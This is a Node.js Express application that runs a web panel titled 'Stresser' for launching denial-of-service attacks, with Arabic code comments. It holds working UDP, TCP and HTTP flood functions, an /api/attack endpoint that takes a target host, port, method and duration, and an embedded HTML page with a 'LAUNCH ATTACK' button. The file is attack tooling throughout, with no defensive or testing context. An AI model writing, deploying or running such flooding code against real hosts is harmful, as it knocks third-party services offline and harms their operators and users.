const express = require('express');
const dgram = require('dgram');
const net = require('net');
const http = require('http');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// هجوم UDP
function udpFlood(target, port, duration) {
    const socket = dgram.createSocket('udp4');
    const endTime = Date.now() + duration * 1000;
    const sendPacket = () => {
        if (Date.now() > endTime) { socket.close(); return; }
        const msg = crypto.randomBytes(1024);
        socket.send(msg, 0, msg.length, port, target, (err) => {
            if (err) socket.close();
            else setImmediate(sendPacket);
        });
    };
    for (let i = 0; i < 50; i++) sendPacket();
}

// هجوم TCP
function tcpFlood(target, port, duration) {
    const endTime = Date.now() + duration * 1000;
    const connect = () => {
        if (Date.now() > endTime) return;
        const client = new net.Socket();
        client.setTimeout(2000);
        client.connect(port, target, () => {
            client.write(crypto.randomBytes(1024));
        });
        client.on('error', () => client.destroy());
        client.on('close', () => setImmediate(connect));
        client.on('timeout', () => client.destroy());
    };
    for (let i = 0; i < 100; i++) connect();
}

// هجوم HTTP
function httpFlood(target, port, duration) {
    const endTime = Date.now() + duration * 1000;
    const sendReq = () => {
        if (Date.now() > endTime) return;
        const req = http.request({
            hostname: target, port: port, path: '/?' + Math.random(), method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
        }, (res) => {
            res.on('data', () => {});
            res.on('end', () => setImmediate(sendReq));
        });
        req.on('error', () => setImmediate(sendReq));
        req.end();
    };
    for (let i = 0; i < 50; i++) sendReq();
}

// استقبال الأوامر
app.post('/api/attack', (req, res) => {
    const { target, port, method, duration } = req.body;
    if (!target || !port || !method || !duration) return res.status(400).json({ error: 'Missing data' });
    
    try {
        if (method === 'udp') udpFlood(target, parseInt(port), parseInt(duration));
        else if (method === 'tcp') tcpFlood(target, parseInt(port), parseInt(duration));
        else if (method === 'http') httpFlood(target, parseInt(port), parseInt(duration));
        res.json({ success: true, message: `Attack sent on ${target}:${port} (${method}) for ${duration}s` });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// واجهة الموقع (HTML مدمج)
app.get('/', (req, res) => {
    res.send(`
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Stresser</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; background: #050505; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
  .box { width: 100%; max-width: 400px; background: #0a0a0a; border: 1px solid #00ff00; padding: 20px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
  h1 { text-align: center; color: #ff0000; font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 10px red; }
  label { display: block; margin-bottom: 5px; font-size: 13px; }
  input, select { width: 100%; padding: 12px; background: #111; color: #00ff00; border: 1px solid #333; margin-bottom: 15px; font-family: inherit; font-size: 16px; border-radius: 4px; }
  input:focus, select:focus { outline: none; border-color: #00ff00; }
  button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.2s; text-transform: uppercase; }
  button:hover { background: #cc0000; box-shadow: 0 0 15px red; }
  #log { background: #000; border: 1px solid #333; padding: 10px; height: 80px; overflow-y: auto; font-size: 12px; margin-top: 15px; color: #888; border-radius: 4px; }
</style>
</head>
<body>
<div class="box">
  <h1>☠️ STRESSER ☠️</h1>
  <label>Target IP / URL</label>
  <input type="text" id="target" placeholder="1.1.1.1">
  
  <label>Port</label>
  <input type="number" id="port" value="80">
  
  <label>Method</label>
  <select id="method">
    <option value="udp">UDP FLOOD</option>
    <option value="tcp">TCP FLOOD</option>
    <option value="http">HTTP FLOOD</option>
  </select>
  
  <label>Duration (Seconds)</label>
  <input type="number" id="duration" value="60">
  
  <button onclick="launch()">LAUNCH ATTACK</button>
  <div id="log">> Waiting for command...</div>
</div>
<script>
async function launch() {
  const target = document.getElementById('target').value;
  const port = document.getElementById('port').value;
  const method = document.getElementById('method').value;
  const duration = document.getElementById('duration').value;
  const log = document.getElementById('log');

  if (!target) return alert('Enter a target!');
  log.innerHTML = '> Sending attack command...';
  log.style.color = '#ffff00';

  try {
    const res = await fetch('/api/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target, port, method, duration })
    });
    const data = await res.json();
    if (res.ok) { log.innerHTML = '> [SUCCESS] ' + data.message; log.style.color = '#00ff00'; }
    else { log.innerHTML = '> [ERROR] ' + data.error; log.style.color = '#ff0000'; }
  } catch (err) {
    log.innerHTML = '> [FAILED] Connection error.'; log.style.color = '#ff0000';
  }
}
</script>
</body>
</html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Panel running on ' + PORT));